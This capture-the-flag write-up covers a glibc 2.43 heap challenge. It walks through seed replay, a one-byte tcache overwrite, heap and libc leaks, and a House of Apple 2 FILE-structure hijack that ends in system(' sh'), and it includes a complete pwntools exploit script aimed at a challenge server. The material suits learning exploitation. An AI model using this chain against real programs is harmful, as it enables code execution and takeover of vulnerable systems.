---
title: "Our Time's passed, John"
date: 2026-08-22
description: 'Exploiting a deterministic heap layout with tcache poisoning and House of Apple 2.'
category: '$n1phers-3-0-ctf'
discipline: 'binary-exploitation'
authors: ['abdieeuh']
draft: false
---

## Challenge Overview

This is a heap challenge using the supplied glibc 2.43. The binary has full RELRO, a stack canary, NX, PIE, SHSTK and IBT enabled.

The challenge gives us a very small menu and one unusual primitive: a single byte can be written to `base + heap_idx`, where `base` is the initial heap break. The seed used to construct the initial heap layout is printed by option `0`, so the heap can be reconstructed deterministically.

The technique chain is:

1. Heap layout reconstruction
2. One-byte tcache head overwrite
3. Cross-bin tcache poisoning
4. Safe-linking heap leak
5. Forged chunk and unsorted-bin libc leak
6. House of Apple 2 through `_IO_list_all`

## Challenge Features

The exploit uses the following high-value features.

| Feature | Security relevance |
|---|---|
| `calloc(1, size)` allocations | Small tcache allocations are cleared but the small-tcache path does not validate a forged target's chunk header. |
| Stale chunk-table pointer | `delete` clears the table entry for the deleted index, but another index can still point to the same allocation after tcache poisoning. |
| One-byte write | The write can change the low byte of a tcache bin head without knowing the absolute heap address. |
| Seed disclosure | Option `0` prints the exact `time(NULL)` seed used by `srand`, removing the need to guess the random heap layout. |
| libc exit cleanup | An invalid menu option calls `exit`, which gives a reliable `_IO_list_all` traversal trigger. |

## Attack Vector

The menu inputs have these roles:

| Input | Verified role |
|---|---|
| Create | Places chunks with selected request sizes into a predictable sequence. |
| Delete | Initializes tcache and moves selected chunks into known bins. |
| Edit | Writes an exact-size payload through the stale pointer. |
| Show | Reads the stale freed chunk and exposes safe-linking or unsorted-bin metadata. |
| Write index | Performs the single arbitrary byte write relative to the initial heap break. |
| Invalid menu choice | Calls `exit()` and triggers libc I/O cleanup. |

## Root Cause

### Main Primitive: One-Byte Heap Write

The write-index handler is effectively:

```c
int heap_idx;
int value;

scanf("%d", &heap_idx);
scanf("%d", &value);
*(unsigned char *)(base + heap_idx) = (unsigned char)value;
```

The address is checked to be inside the current heap range, but there is no restriction on which heap object is targeted. The write is only one byte, so it is not enough for a normal arbitrary write. The important target is a tcache bin head whose pointer differs from the desired pointer only in its low byte.

### Deterministic Initial Layout

The initializer first does:

```c
srand(time(NULL));
count = rand() % 256 + 1;
for (i = 0; i < count; i++)
    malloc(rand() % 1024 + 1);
```

For a random request `r`, the x86-64 chunk size is:

```python
max((r + 0x17) & ~0xf, 0x20)
```

Replaying the same libc `rand()` calls gives `rnd`, the offset of the first controlled chunk from `base`.

The controlled allocation layout is:

```text
P + 0x00   G header, size 0x20
P + 0x20   A header, size 0x410, request 0x400
P + 0x430  B header, size 0x20
P + 0x450  C header, size 0x20
P + 0x470  top chunk header
P + 0x480  tcache user pointer
P + 0x518  tcache->entries[0]
```

Here `P = base + rnd + pads * 0x20`. glibc 2.43 has 76 tcache bins, so:

```c
uint16_t num_slots[76];       // 0x98 bytes
tcache_entry *entries[76];
```

Thus `entries[0]` is at tcache offset `0x98`.

The pads are selected so that:

```text
G user = P + 0x10
A user = P + 0x30
```

are in the same `0x100` page. The low-byte overwrite can then turn the bin-0 head from `G user` into `A user` without knowing the heap base.

## Information Leak

### Cross-bin tcache poison

Freeing `G` initializes tcache and places it in bin 0. The one-byte write changes the low byte of `tcache->entries[0]` to the low byte of `A user`.

The next `calloc(1, 1)` returns `A user`, while the original index for `A` still points to it. We now have two indexes for the same allocation.

Freeing the alias uses the real size stored in `A`'s chunk header, `0x410`, and puts it in tcache bin 63. The original `A` index is a UAF view.

### Heap leak

With an empty tcache bin, glibc writes this safe-linked value into the freed chunk:

```text
PROTECT_PTR(&A->next, NULL) = A_user >> 12
```

The value returned by `show(A)` therefore gives the heap page. The exact base calculation is:

```python
heap_base = (safe_link << 12) - (auser_offset & ~0xfff)
```

## Libc Leak

The UAF pointer is edited with:

```text
A->next = PROTECT_PTR(A_user, A_header)
```

Two `calloc(1, 0x400)` calls return `A user` and then `A header`. The second result is accepted by the small-tcache path even though it points at a chunk header.

The forged header is:

```text
prev_size = 0
size      = 0x431
```

Freeing `A user` makes malloc treat it as a `0x430` chunk. The next chunk is `C`, so the chunk is placed in the unsorted bin. Its first qword is the empty unsorted-bin pointer.

For the supplied libc build:

```text
unsorted fd = libc_base + 0x212ac8
libc_base   = unsorted fd - 0x212ac8
```

The `0x212ac8` offset is the actual `bin_at(main_arena, 1)` location for this glibc build.

## House of Apple 2

The forged header is changed to `0x91`, placing `A` in tcache bin 7. The next pointer is poisoned to:

```text
_IO_list_all - 0x70 = libc_base + 0x213410
```

Two `calloc(1, 0x80)` calls then provide a write at `_IO_list_all`.

The fake `FILE` is placed at `A user`:

| Offset | Value |
|---:|---|
| `0x00` | `" sh\\0"` flags |
| `0x20` | `_IO_write_base = 0` |
| `0x28` | `_IO_write_ptr = 1` |
| `0x88` | Separate zeroed heap storage for `_lock` |
| `0xa0` | Fake `_wide_data` |
| `0xd8` | `libc + 0x211228` (`_IO_wfile_jumps`) |

The fake wide-data area contains:

```text
wide-data + 0x18  _IO_write_base = 0
wide-data + 0x30  _IO_buf_base   = 0
wide-data + 0xe0  fake wide vtable
wide-vtable + 0x68                = libc + 0x5c560 (system)
```

The lock must not point at the fake `FILE` itself. libc's lock operation would overwrite the first qword and change the `" sh"` command string into mutex state.

An invalid menu choice calls `exit()`. During libc cleanup, `_IO_list_all` reaches the fake stream, `_IO_wfile_overflow` calls `_IO_WDOALLOCATE(fp)`, and the forged wide-vtable slot calls `system(fp)`. The command is ` sh`, giving a shell on the socket.

## Solution

The exploit uses one deterministic layout and one short final trigger.

| Stage | Standard technique | Result |
|---|---|---|
| 1 | Replay `srand`/`rand` and malloc chunk sizes | Exact relative addresses for `G`, `A`, `B`, `C`, and tcache |
| 2 | One-byte overwrite of tcache bin 0 | `calloc(1, 1)` returns the live `A` chunk |
| 3 | UAF read | Heap safe-linking leak |
| 4 | Tcache poison plus forged `0x431` header | Unsorted-bin libc leak |
| 5 | Tcache bin 7 poison | Write fake `_IO_list_all` pointer |
| 6 | House of Apple 2 | `system(" sh")`, then read the flag |

The original writeup references a runnable `solve.py`, but the supplied source directory does not contain that file. It uses option `0` as an authoritative seed oracle before the exploit connection. If the two connections cross a `time(NULL)` boundary, it re-reads the seed and retries; it does not guess or brute-force seeds.

```bash
python3 solve.py remote
```

The payload construction in the solver is:

```python
put(0x00, 0x00687320)             # " sh\0"
put(0x20, 0)                      # _IO_write_base
put(0x28, 1)                      # _IO_write_ptr
put(0x88, auser + 0x300)          # separate zeroed mutex storage
put(0xa0, auser + 0x100)          # _wide_data
put(0xd8, libc_base + 0x211228)   # _IO_wfile_jumps
put(0x118, 0)                     # wide _IO_write_base
put(0x130, 0)                     # wide _IO_buf_base
put(0x1e0, auser + 0x200)         # fake wide vtable
put(0x268, libc_base + 0x5c560)   # __doallocate = system
```

## Exploit Success

The solver was validated against `13.203.69.239:31003`:

```text
[*] heap base=0x57026d64f000
[*] libc base=0x72f4be8a6000
You can't ROP on what never returns, John.
$N1PH€RSxTCTF{1_h4D_90DD4Mn_pL4NnNNNnNNN_1b4B4c40}
```

## Appendix

**Exploit**

The full exploit script, including the deterministic `rand()` replay, remote seed synchronization, all menu wrappers, leak validation, tcache encodings and final shell trigger.

```python
#!/usr/bin/env python3
from pwn import *
import ctypes
import os
import re
import sys
import time

HOST = '13.203.69.239'
PORT = 31003
LOCAL_CHALL = '/tmp/john/chall'

context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'


def random_heap_offset(seed):
    """Reproduce init(): rand() and the retained random malloc() calls."""
    libc = ctypes.CDLL(os.path.abspath('libc.so.6'))
    libc.srand(ctypes.c_uint(seed))
    libc.rand.restype = ctypes.c_int
    count = libc.rand() % 256 + 1
    requests = [libc.rand() % 1024 + 1 for _ in range(count)]
    chunks = [max((request + 0x17) & ~0xf, 0x20)
              for request in requests]
    return sum(chunks)


def seed_from_remote():
    probe = remote(HOST, PORT)
    try:
        probe.sendlineafter(b'choice > ', b'0')
        output = probe.recvall(timeout=2)
    finally:
        probe.close()
    match = re.search(rb"It's (0x[0-9a-fA-F]+)", output)
    if not match:
        raise RuntimeError(f'could not parse seed from {output!r}')
    return int(match.group(1), 16)


def exploit(io, seed):
    io.timeout = 4
    sendlineafter = io.sendlineafter

    def create(index, size):
        sendlineafter(b'choice > ', b'1')
        sendlineafter(b'idx > ', str(index).encode())
        sendlineafter(b'size > ', str(size).encode())

    def delete(index):
        sendlineafter(b'choice > ', b'2')
        sendlineafter(b'idx > ', str(index).encode())

    def edit(index, data):
        sendlineafter(b'choice > ', b'3')
        sendlineafter(b'idx > ', str(index).encode())
        io.sendafter(b'Data: ', data)
        io.recvuntil(b'Updated')

    def show(index, size):
        sendlineafter(b'choice > ', b'4')
        sendlineafter(b'idx > ', str(index).encode())
        io.recvuntil(b'DATA_BEGIN{')
        data = io.recvn(size)
        io.recvuntil(b'}DATA_END')
        io.recvuntil(b'Done!\n')
        return data

    def write_index(index, value):
        sendlineafter(b'choice > ', b'5')
        sendlineafter(b'heap_idx > ', str(index).encode())
        sendlineafter(b'value > ', str(value).encode())

    rnd = random_heap_offset(seed)
    log.info('seed=%#x random heap allocation total=%#x', seed, rnd)

    # Layout: G(0x20), A(0x410), B(0x20), C(0x20).
    # The pads keep G->user and A->user in the same 0x100 page so the
    # single-byte write can change only G's low pointer byte.
    pads = next(k for k in range(16)
                if ((rnd + k * 0x20 + 0x10) & 0xff) <= 0xdf)
    for index in range(pads):
        create(index, 1)
    f = pads
    a = f + 1
    b = a + 1
    c = b + 1
    alias = c + 1

    create(f, 1)
    create(a, 0x400)
    create(b, 1)
    create(c, 1)

    guser_off = rnd + pads * 0x20 + 0x10
    auser_off = rnd + pads * 0x20 + 0x30
    tcache_off = rnd + pads * 0x20 + 0x480
    assert (guser_off & ~0xff) == (auser_off & ~0xff)

    # glibc 2.43: num_slots[76] occupies 0x98 bytes, then entries[0].
    delete(f)
    write_index(tcache_off + 0x98, auser_off & 0xff)
    create(alias, 1)                 # bin 0 now returns A's user pointer

    # A remains tracked at index a, giving a UAF view after alias is freed.
    marker = p64(0x4141414141414141) + b'\0' * (0x400 - 8)
    edit(a, marker)
    delete(alias)                    # A enters tcache bin 63
    heap_data = show(a, 0x400)
    safe_link = u64(heap_data[:8])
    if safe_link == 0x4141414141414141:
        raise RuntimeError('seed mismatch: cross-bin tcache poison missed A')
    heap_base = (safe_link << 12) - (auser_off & ~0xfff)
    if heap_base & 0xfff:
        raise RuntimeError('invalid heap leak')
    log.info('heap base=%#x', heap_base)

    auser = heap_base + auser_off
    ahead = auser - 0x10

    # Poison bin 63 to A's header.  Small-tcache calloc does not validate the
    # forged target's chunk header, so the header itself becomes editable.
    protected_header = (auser >> 12) ^ ahead
    edit(a, p64(protected_header) + p64(0) + b'\0' * (0x400 - 16))
    pop = alias + 1
    fake_header = alias + 2
    create(pop, 0x400)
    create(fake_header, 0x400)

    # Make A appear to be a 0x430 chunk whose next chunk is C.  Freeing it
    # therefore sends it to unsorted, exposing the empty unsorted-bin pointer.
    edit(fake_header, p64(0) + p64(0x431) + b'\0' * (0x400 - 16))
    delete(pop)
    libc_data = show(a, 0x400)
    unsorted = u64(libc_data[:8])
    libc_base = unsorted - 0x212ac8
    if libc_base & 0xfff:
        raise RuntimeError(f'invalid libc leak: {unsorted:#x}')
    log.info('libc base=%#x', libc_base)

    # Recycle A through bin 7 and poison it to _IO_list_all-0x70.
    edit(fake_header, p64(0) + p64(0x91) + b'\0' * (0x400 - 16))
    delete(a)
    io_list_all = libc_base + 0x213480
    tcache_target = io_list_all - 0x70
    protected_target = (auser >> 12) ^ tcache_target
    edit(fake_header, p64(0) + p64(0x91) + p64(protected_target)
         + b'\0' * (0x400 - 24))

    tcache_slot = fake_header + 1
    tcache_target_index = fake_header + 2
    create(tcache_slot, 0x80)
    create(tcache_target_index, 0x80)
    edit(tcache_target_index, b'\0' * 0x70 + p64(auser)
         + b'\0' * (0x80 - 0x78))

    # House of Apple 2: _IO_list_all -> fake FILE -> wide doallocate -> system.
    fake_file = bytearray(0x3f0)

    def put(offset, value):
        fake_file[offset:offset + 8] = p64(value)

    put(0x00, 0x00687320)             # " sh\0"
    put(0x20, 0)                      # _IO_write_base
    put(0x28, 1)                      # _IO_write_ptr > _IO_write_base
    put(0x88, auser + 0x300)          # separate zeroed mutex storage
    put(0xa0, auser + 0x100)          # _wide_data
    put(0xd8, libc_base + 0x211228)   # _IO_wfile_jumps
    put(0x118, 0)                     # wide _IO_write_base
    put(0x130, 0)                     # wide _IO_buf_base
    put(0x1e0, auser + 0x200)         # fake wide vtable
    put(0x268, libc_base + 0x5c560)   # fake __doallocate = system
    edit(fake_header, b'\0' * 0x10 + bytes(fake_file))

    sendlineafter(b'choice > ', b'9')
    io.sendline(b'cat /flag* 2>/dev/null; cat flag.txt 2>/dev/null')
    output = io.recvrepeat(3)
    io.close()
    return output


def main():
    if len(sys.argv) == 1 or sys.argv[1] == 'remote':
        # A probe connection exits after printing its authoritative seed.
        # Re-probe only when the next connection crossed a time(NULL) tick;
        # this is synchronization, not guessing a seed.
        for attempt in range(5):
            seed = seed_from_remote()
            io = remote(HOST, PORT)
            try:
                output = exploit(io, seed)
                print(output.decode('utf-8', errors='replace'), end='')
                if b'$N1PH' not in output:
                    raise RuntimeError('shell opened but flag was not printed')
                return
            except (EOFError, RuntimeError, ValueError, AssertionError) as error:
                io.close()
                log.warning('seed synchronization attempt %d failed: %s',
                            attempt + 1, error)
        raise SystemExit('could not synchronize with the remote seed')

    seed = int(time.time())
    output = exploit(process([LOCAL_CHALL]), seed)
    print(output.decode('utf-8', errors='replace'), end='')


if __name__ == '__main__':
    main()
```

## Flag

```text
$N1PH€RSxTCTF{1_h4D_90DD4Mn_pL4NnNNNnNNN_1b4B4c40}
```
